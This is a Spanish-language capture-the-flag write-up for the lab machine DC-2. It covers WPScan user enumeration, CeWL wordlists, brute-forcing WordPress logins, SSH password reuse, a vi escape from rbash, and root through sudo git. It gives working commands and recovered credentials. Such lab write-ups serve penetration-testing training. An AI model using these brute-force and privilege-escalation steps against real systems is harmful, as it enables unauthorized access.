# DC-2

## Datos de la máquina

**IP:** 192.168.56.105
**OS:** Linux (Debian 8)
**Dificultad:** Media
**Servicios clave:** HTTP (WordPress) / SSH (puerto 7744)
**Fecha:** 2026-04-26
**Skills:** #WordPress #WPScan #cewl #rbash #GitPrivesc #CMS #BruteForce

---

## 1. Configuración previa

La máquina no respondía por IP directamente porque Apache tenía configurado un VirtualHost que solo respondía al nombre `dc-2`. El nmap lo reveló:

```
|_http-title: Did not follow redirect to http://dc-2/
```

Solución — añadir la entrada al `/etc/hosts` de Kali:

```shell
echo "192.168.56.105 dc-2" | sudo tee -a /etc/hosts
```

**Lección:** Cuando nmap muestre `Did not follow redirect to http://nombre/`, siempre añadir esa entrada al `/etc/hosts`.

---

## 2. Reconocimiento

```shell
nmap -p- -sV -sC --min-rate 5000 192.168.56.105
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | HTTP | Apache 2.4.10 (Debian) |
| 7744/tcp | SSH | OpenSSH 6.7p1 Debian |

**Observaciones:**
- SSH en puerto no estándar (7744) — siempre especificar con `-p 7744`
- Solo dos puertos — el vector principal es el puerto 80

---

## 3. Enumeración Web

### Identificación del CMS

Al visitar `http://dc-2/` se identificó **WordPress 4.7.10** — versión desactualizada e insegura.

**Pistas encontradas en la web:**
- Menú con una página llamada "Flag" — siempre revisar el menú de navegación
- Código fuente reveló usuario `jerry` en la URL `/index.php/author/jerry/`
- La meta etiqueta confirmó la versión: `<meta name="generator" content="WordPress 4.7.10" />`

### Flag 1

La Flag 1 contenía pistas cruciales:
```
Your usual wordlists probably won't work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can't win them all.
Log in as one to see the next flag.
If you can't find it, log in as another.
```

**Interpretación:**
- "be cewl" → usar la herramienta **CeWL** para generar wordlist
- "Log in as one... log in as another" → hay múltiples usuarios con distintas contraseñas

### Enumeración de usuarios con WPScan

```shell
wpscan --url http://dc-2 --enumerate u
```

**Usuarios encontrados:** `admin`, `jerry`, `tom`

**Nota:** WordPress expone usuarios por defecto via:
- `/?author=1`, `/?author=2`...
- `/wp-json/wp/v2/users/`
- RSS feeds

### Generación de wordlist con CeWL

```shell
cewl -d 3 -m 3 --lowercase -w palabras_cewl.txt http://dc-2/
```

CeWL rastrea la web y extrae todas las palabras del contenido para crear una wordlist personalizada. La lógica es que las contraseñas suelen estar relacionadas con el contenido del sitio.

### Fuerza bruta con WPScan

```shell
wpscan --url http://dc-2 --usernames jerry --passwords palabras_cewl.txt --password-attack wp-login
```

**Credenciales encontradas:**
- `jerry / adipiscing`
- `tom / parturient`

---

## 4. Acceso inicial — SSH como tom

### Flag 2

Al entrar como jerry al panel de WordPress se encontró la Flag 2:
```
If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.
```

La pista señalaba al SSH como vector alternativo.

### Conexión SSH

```shell
ssh tom@192.168.56.105 -p 7744
# contraseña: parturient
```

**Importante:** Las credenciales de WordPress de tom (`parturient`) funcionaron para SSH — reutilización de contraseñas.

Las credenciales de jerry (`adipiscing`) **no** funcionaron para SSH directamente.

---

## 5. Escape de rbash (Restricted Bash)

### Qué es rbash

Al conectarse por SSH como tom se obtuvo una **rbash** (restricted bash) — una shell con comandos muy limitados. Síntomas:

```
-rbash: cat: command not found
-rbash: su: command not found
-rbash: PATH: readonly variable
```

rbash restringe:
- Cambiar el PATH
- Usar rutas absolutas (`/bin/bash`)
- Ejecutar comandos fuera del directorio permitido

### Método de escape — vi

```shell
vi flag3.txt
```

Dentro de vi (en modo comando):
```
:set shell=/bin/sh
:shell
```

Esto lanza `/bin/sh` desde vi, que no está restringida.

Desde `/bin/sh` lanzar bash:
```shell
/bin/bash
```

Arreglar el PATH:
```shell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Flag 3

```
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

Pista: usar `su jerry`.

---

## 6. Movimiento lateral — tom → jerry

Con bash completo y PATH correcto:

```shell
su jerry
# contraseña: adipiscing (la misma que en WordPress)
```

**Nota importante:** La contraseña de jerry para `su` era la misma que para WordPress (`adipiscing`), aunque no funcionaba directamente por SSH. Esto es porque el servidor SSH puede tener configuraciones que bloqueen ciertos usuarios.

### Flag 4

```
Good to see that you've made it this far - but you're not home yet.
You still need to get the final flag (the only flag that really counts!!!).
No hints here - you're on your own now.
Go on - git outta here!!!
```

Pista obvia: **git**.

---

## 7. Escalada de privilegios — jerry → root

### sudo -l como jerry

```shell
sudo -l
# (root) NOPASSWD: /usr/bin/git
```

Jerry puede ejecutar `git` como root sin contraseña.

### Explotación via git (GTFOBins)

```shell
sudo git help config
```

Esto abre el manual de git en un paginador (menos o more). Dentro del paginador:
```
!/bin/bash
```

El `!` en el paginador ejecuta comandos del shell — como lo está ejecutando `sudo`, el bash resultante es root.

**Flag final:**
```
Congratulations!!!
```

---

## 8. Técnica adicional — extracción de hashes desde MySQL

Durante la investigación se accedió a MySQL para buscar la contraseña de jerry:

```shell
mysql -u wpadmin -p4uTiLL wordpressdb
```

```sql
SELECT user_login, user_pass FROM wp_users;
```

Los hashes de WordPress usan el formato **phpass** (`$P$`). Para crackearlos con John:

```shell
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass
```

**Lección:** Siempre especificar `--format=phpass` para hashes de WordPress, de lo contrario John puede usar el formato incorrecto y ser mucho más lento.

---

## 9. Resumen del ataque

```
nmap → puerto 80 (WordPress 4.7.10) + 7744 (SSH)
         ↓
/etc/hosts → añadir dc-2
         ↓
Código fuente → usuario jerry identificado
         ↓
WPScan enumerate → admin, jerry, tom
         ↓
Flag 1 → pista: usar cewl
         ↓
cewl → wordlist personalizada del sitio
         ↓
WPScan brute force → jerry/adipiscing + tom/parturient
         ↓
Panel WordPress jerry → Flag 2 (pista: otro entry point = SSH)
         ↓
SSH tom/parturient puerto 7744 → rbash
         ↓
vi → :set shell=/bin/sh → :shell → /bin/bash → export PATH
         ↓
Flag 3 (pista: su jerry)
         ↓
su jerry/adipiscing → Flag 4 (pista: git)
         ↓
sudo -l → git sin contraseña
         ↓
sudo git help config → !/bin/bash → ROOT ✅
         ↓
Flag final en /root/final-flag.txt
```

---

## 10. Lecciones aprendidas

- Cuando nmap muestre redirección a un nombre, añadirlo siempre al `/etc/hosts`
- WordPress expone usuarios por defecto — siempre enumerar con WPScan
- **cewl** genera wordlists del contenido de la web — más efectivo que rockyou para aplicaciones con contenido específico
- Las contraseñas de aplicaciones web a veces se reutilizan en SSH
- **rbash** se puede escapar fácilmente con vi usando `:set shell=/bin/sh` + `:shell`
- Después de escapar rbash, siempre arreglar el PATH: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
- `sudo -l` es siempre el primer comando tras conseguir shell de un nuevo usuario
- **git** con sudo → GTFOBins → `sudo git help config` → `!/bin/bash` → root
- Los hashes de WordPress son `phpass` — especificar `--format=phpass` en John
- Cuando estés atascado: `find / -name "*.txt" 2>/dev/null` para buscar flags y pistas
